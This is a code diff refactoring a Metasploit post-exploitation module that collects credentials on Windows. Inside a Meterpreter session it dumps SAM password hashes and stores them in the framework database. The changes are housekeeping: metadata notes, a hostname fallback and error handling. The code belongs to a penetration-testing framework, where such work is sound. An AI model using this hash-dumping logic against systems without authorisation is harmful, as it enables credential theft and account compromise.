@@ -11,11 +11,18 @@ class MetasploitModule < Msf::Post
       update_info(
         info,
         'Name' => 'Windows Gather Credential Collector',
-        'Description' => %q{ This module harvests credentials found on the host and stores them in the database.},
+        'Description' => %q{
+          This module harvests credentials found on the host and stores them in the database.
+        },
         'License' => MSF_LICENSE,
         'Author' => [ 'tebo[at]attackresearch.com'],
         'Platform' => [ 'win' ],
         'SessionTypes' => [ 'meterpreter'],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -28,15 +35,9 @@ class MetasploitModule < Msf::Post
     )
   end
 
-  # Run Method for when run command is issued
   def run
-    print_status("Running module against #{sysinfo['Computer']}")
-    # Collect even without a database to store them.
-    if session.framework.db.active
-      db_ok = true
-    else
-      db_ok = false
-    end
+    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
+    print_status("Running module against #{hostname} (#{session.session_host})")
 
     # Make sure we're rockin Priv and Incognito
     session.core.use('priv') if !session.priv
@@ -46,8 +47,7 @@ class MetasploitModule < Msf::Post
     begin
       hashes = client.priv.sam_hashes
     rescue StandardError
-      print_error('Error accessing hashes, did you migrate to a process that matched the target\'s architecture?')
-      return
+      fail_with(Failure::Unknown, "Error accessing hashes, did you migrate to a process that matched the target's architecture?")
     end
 
     # Target infos for the db record
@@ -55,7 +55,7 @@ class MetasploitModule < Msf::Post
     # client.framework.db.report_host(:host => addr, :state => Msf::HostState::Alive)
 
     # Record hashes to the running db instance
-    print_good 'Collecting hashes...'
+    print_good('Collecting hashes...')
 
     hashes.each do |hash|
       # Build service information
@@ -107,7 +107,8 @@ class MetasploitModule < Msf::Post
       data[:update] = :unique_data
 
       print_line "    #{data[:data]}"
-      report_note(data) if db_ok
+
+      report_note(data)
     end
   end
 end
